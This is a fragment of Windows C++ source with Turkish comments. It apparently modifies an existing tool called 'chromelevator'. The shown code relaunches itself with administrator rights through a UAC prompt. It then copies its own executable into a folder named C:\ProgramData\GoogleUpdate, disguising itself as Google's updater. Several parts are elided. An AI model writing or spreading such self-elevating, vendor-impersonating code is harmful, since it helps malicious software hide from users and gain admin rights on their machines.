...
int wmain(int argc, wchar_t* argv[]) {
    ...
    if (!isElevated) {
        ...
        sei.lpVerb = L"runas";
        sei.lpFile = szPath;
        sei.lpParameters = GetCommandLineW();  // Mevcut argümanları aynen ilet
        sei.nShow = SW_SHOWNORMAL;

        if (ShellExecuteExW(&sei)) {
            return 0;   // Yeni yükseltilmiş process çalıştı, bu process sonlansın
        }
        return 0;       // Kullanıcı iptal ettiyse veya hata oluştuysa da çık
    }
    // ---------- UAC SONU ----------

    // ---------- KENDİNİ KOPYALA VE ÇALIŞTIR ----------
    wchar_t currentPath[MAX_PATH];
    GetModuleFileNameW(NULL, currentPath, MAX_PATH);

    std::wstring targetDir = L"C:\\ProgramData\\GoogleUpdate\\";
    CreateDirectoryW(targetDir.c_str(), NULL);

    std::wstring targetExe = targetDir + L"chromelevator.exe";

    if (targetExe != std::wstring(currentPath)) {
        if (CopyFileW(currentPath, targetExe.c_str(), FALSE)) {
    ...
    // ---------- ORİJİNAL İŞ AKIŞI (Aşağısı hiç değişmedi) ----------
    bool verbose = false;
